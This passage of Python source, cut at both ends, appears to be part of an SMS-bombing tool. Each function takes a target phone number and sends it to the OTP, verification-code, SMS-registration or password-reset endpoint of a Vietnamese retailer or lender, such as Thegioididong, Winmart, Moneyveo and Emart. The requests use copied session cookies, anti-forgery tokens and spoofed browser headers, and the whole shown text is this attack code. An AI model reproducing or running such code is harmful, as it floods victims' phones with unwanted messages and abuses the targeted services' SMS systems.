    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_gcl_au': '1.1.1121422736.1720077126',
    '_ga': 'GA1.1.304095547.1720077127',
    '_pk_id.8.8977': 'f4065ec429abd1e2.1720077127.',
    '_ce.clock_data': '-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    '_fbp': 'fb.1.1720077128189.217218927440922861',
    'TBMCookie_3209819802479625248': '350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.8.8977': '1',
    'SvID': 'new2688|Zoaz1|Zoaz0',
    '_ce.irv': 'returning',
    'cebs': '1',
    '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI',
    'cebsp_': '2',
    '_ga_Y7SWKJEHCE': 'GS1.1.1720103888.2.1.1720103890.58.0.0',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1',
    '_ce.s': 'v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1121422736.1720077126; _ga=GA1.1.304095547.1720077127; _pk_id.8.8977=f4065ec429abd1e2.1720077127.; _ce.clock_data=-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; _fbp=fb.1.1720077128189.217218927440922861; TBMCookie_3209819802479625248=350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; SvID=new2688|Zoaz1|Zoaz0; _ce.irv=returning; cebs=1; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI; cebsp_=2; _ga_Y7SWKJEHCE=GS1.1.1720103888.2.1.1720103890.58.0.0; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1; _ce.s=v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476",
    'Origin': 'https://www.dienmayxanh.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Twguyex9_cgh9XeukD7bUARFjQSniZ-oK2sROjdYE3ySLrvJztUU-tZn-ZBnL8wqLJjlGTji6qBtWGJDVYPGVt0U3RgoB0Q2Grd4i24dkz4TUIRjXBHguoShv3oZjAt2s',
}

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)

        ###
def concung(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_pk_id.7.8f7e': '26368263202a729d.1690741327.',
    '_fbp': 'fb.1.1690741326923.344831016',
    '_tt_enable_cookie': '1',
    '_ttp': '4ISzilNrZxHb4rxPiS6GakGBcBl',
    'TBMCookie_3209819802479625248': '256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_gcl_au': '1.1.584652992.1720103764',
    'SvID': 'beline2685|ZoazW|ZoazV',
    '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.7.8f7e': '1',
    '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs',
    '_ga': 'GA1.2.1745564613.1690741327',
    '_gid': 'GA1.2.530012217.1720103766',
    '_gat': '1',
    '_ce.irv': 'returning',
    'cebs': '1',
    '_ga_TZK5WPYMMS': 'GS1.2.1720103766.6.0.1720103766.60.0.0',
    '_ga_TLRZMSX5ME': 'GS1.1.1720103764.33.1.1720103766.58.0.0',
    '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1',
    '_ce.clock_data': '-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'cebsp_': '1',
    '_ce.s': 'v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _pk_id.7.8f7e=26368263202a729d.1690741327.; _fbp=fb.1.1690741326923.344831016; _tt_enable_cookie=1; _ttp=4ISzilNrZxHb4rxPiS6GakGBcBl; TBMCookie_3209819802479625248=256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.584652992.1720103764; SvID=beline2685|ZoazW|ZoazV; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.7.8f7e=1; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs; _ga=GA1.2.1745564613.1690741327; _gid=GA1.2.530012217.1720103766; _gat=1; _ce.irv=returning; cebs=1; _ga_TZK5WPYMMS=GS1.2.1720103766.6.0.1720103766.60.0.0; _ga_TLRZMSX5ME=GS1.1.1720103764.33.1.1720103766.58.0.0; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1; _ce.clock_data=-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; cebsp_=1; _ce.s=v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571",
    'Origin': 'https://www.thegioididong.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMG5vy2Ok1mvC8SbvlKgWIOz2Y3oc5DTGZxHd9t5Hsux7Fa-HK_oS6VsTyiSM9I--XIfDq9NA1NYxg9q87YfcUjoav9khceFwpr0rM5aRgoR-ivz9IHBVr9ZIWxqNXtMWE',
}

    response = requests.post(
    'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
def bestinc(phone):
    headers = {
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}

    json_data = {
    'phoneNumber': phone,
    'verificationCodeType': 1,
}

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)

def money(phone):
    cookies = {
    'CaptchaCookieKey': '0',
    'language': 'vi',
    'UserTypeMarketing': 'L0',
    '__sbref': 'aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux',
    'ASP.NET_SessionId': 'k1lr5wm2mja2oyaf1zkcrdtu',
    'RequestData': '85580b70-8a3a-4ebc-9746-1009df921f42',
    '_gid': 'GA1.2.2031038846.1691083804',
    'UserMachineId_png': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_etag': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_cache': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    '__RequestVerificationToken': 'G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41',
    '_ga_LCPCW0ZYR8': 'GS1.1.1691083803.8.1.1691084292.44.0.0',
    '_ga': 'GA1.2.149632214.1689613025',
    'Marker': 'MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
}

    headers = {
    'authority': 'moneyveo.vn',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'CaptchaCookieKey=0; language=vi; UserTypeMarketing=L0; __sbref=aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux; ASP.NET_SessionId=k1lr5wm2mja2oyaf1zkcrdtu; RequestData=85580b70-8a3a-4ebc-9746-1009df921f42; _gid=GA1.2.2031038846.1691083804; UserMachineId_png=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_etag=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_cache=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId=fd5259b0-62a7-41c7-b5c5-e4ff646af322; __RequestVerificationToken=G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41; _ga_LCPCW0ZYR8=GS1.1.1691083803.8.1.1691084292.44.0.0; _ga=GA1.2.149632214.1689613025; Marker=MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
    'origin': 'https://moneyveo.vn',
    'referer': 'https://moneyveo.vn/vi/registernew/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-d26637ca1a2ab6f01520174ccd97bf37-9060d6bf9370d383-00',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
}

    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)

def winmart(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://winmart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://winmart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-api-merchant': 'WCM',
}

    json_data = {
    'firstName': 'Taylor Jasmine',
    'phoneNumber': phone,
    'masanReferralCode': '',
    'dobDate': '2005-08-05',
    'gender': 'Male',
}

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
def alf(phone):
   headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN',
    'BrandCode': 'ALFRESCOS',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'DeviceCode': 'web',
    'Origin': 'https://alfrescos.com.vn',
    'Referer': 'https://alfrescos.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   params = {
    'culture': 'vi-VN',
}

   json_data = {
    'phoneNumber': phone,
    'secureHash': 'c4c8f1e0d64fb17c352e0456311df372',
    'deviceId': '',
}

   response = requests.post(
    'https://api.alfrescos.com.vn/api/v1/User/CheckPhoneNumberExits',
    params=params,
    headers=headers,
    json=json_data,
)
def phuc(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://order.phuclong.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://order.phuclong.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'userName': phone,
}

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data) 

def emart(phone):
    cookies = {
    'emartsess': 'gmdbftq46lqooc1s5iv9l7nsn0',
    'default': 'e6ec14ce933f55f7f1a9bb7355',
    'language': 'vietn',
    'currency': 'VND',
    '_fbp': 'fb.2.1691143292627.1008340188',
    '_gid': 'GA1.3.332853186.1691143293',
    '_gat_gtag_UA_117859050_1': '1',
    '_ga_ZTB26JV4YJ': 'GS1.1.1691143293.1.1.1691143433.0.0.0',
    '_ga': 'GA1.1.736434119.1691143293',
}

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'emartsess=gmdbftq46lqooc1s5iv9l7nsn0; default=e6ec14ce933f55f7f1a9bb7355; language=vietn; currency=VND; _fbp=fb.2.1691143292627.1008340188; _gid=GA1.3.332853186.1691143293; _gat_gtag_UA_117859050_1=1; _ga_ZTB26JV4YJ=GS1.1.1691143293.1.1.1691143433.0.0.0; _ga=GA1.1.736434119.1691143293',
    'Origin': 'https://emartmall.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'X-Requested-With': 'XMLHttpRequest',
}

    data = {
    'mobile': phone,
}

    response = requests.post(
    'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
    cookies=cookies,
    headers=headers,
    data=data,
)

def hana(phone):
   cookies = {
    '_gcl_au': '1.1.487662989.1723207344',
    '_gid': 'GA1.2.1011519595.1723207344',
    '_tt_enable_cookie': '1',
    '_ttp': 'tjNa--9H4QzK-hD9vR5pwlcBjuy',
    '_ym_uid': '1723207346172647753',
    '_ym_d': '1723207346',
    '_ym_isad': '1',
    '_gcl_aw': 'GCL.1723269932.CjwKCAjw_Na1BhAlEiwAM-dm7LrKXqRiAUTq4nnFeOHoz4JDpUYWH9LmuruiIdMbKsSNV8yJz8HFfxoChogQAvD_BwE',
    '_fbp': 'fb.1.1723269932317.251662867841419932',
    '_ga': 'GA1.2.1243190707.1723207344',
    '_gac_UA-151110385-1': '1.1723269932.CjwKCAjw_Na1BhAlEiwAM-dm7LrKXqRiAUTq4nnFeOHoz4JDpUYWH9LmuruiIdMbKsSNV8yJz8HFfxoChogQAvD_BwE',
    '_ym_visorc': 'w',
    '_ga_P2783EHVX2': 'GS1.1.1723269932.2.1.1723270058.60.0.0',
}

   headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_gcl_au=1.1.487662989.1723207344; _gid=GA1.2.1011519595.1723207344; _tt_enable_cookie=1; _ttp=tjNa--9H4QzK-hD9vR5pwlcBjuy; _ym_uid=1723207346172647753; _ym_d=1723207346; _ym_isad=1; _gcl_aw=GCL.1723269932.CjwKCAjw_Na1BhAlEiwAM-dm7LrKXqRiAUTq4nnFeOHoz4JDpUYWH9LmuruiIdMbKsSNV8yJz8HFfxoChogQAvD_BwE; _fbp=fb.1.1723269932317.251662867841419932; _ga=GA1.2.1243190707.1723207344; _gac_UA-151110385-1=1.1723269932.CjwKCAjw_Na1BhAlEiwAM-dm7LrKXqRiAUTq4nnFeOHoz4JDpUYWH9LmuruiIdMbKsSNV8yJz8HFfxoChogQAvD_BwE; _ym_visorc=w; _ga_P2783EHVX2=GS1.1.1723269932.2.1.1723270058.60.0.0',
    'origin': 'https://vayvnd.vn',
    'priority': 'u=1, i',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'login': phone,
    'trackingId': '9fNiOwzJvRuqkOH2BqnIxbQdMjAf6bzeEE2tnw8zMc0Slb6tc3rSWZkf8av6yvtK',
    'antispamCheckData': {
        'hostname': 'vayvnd.vn',
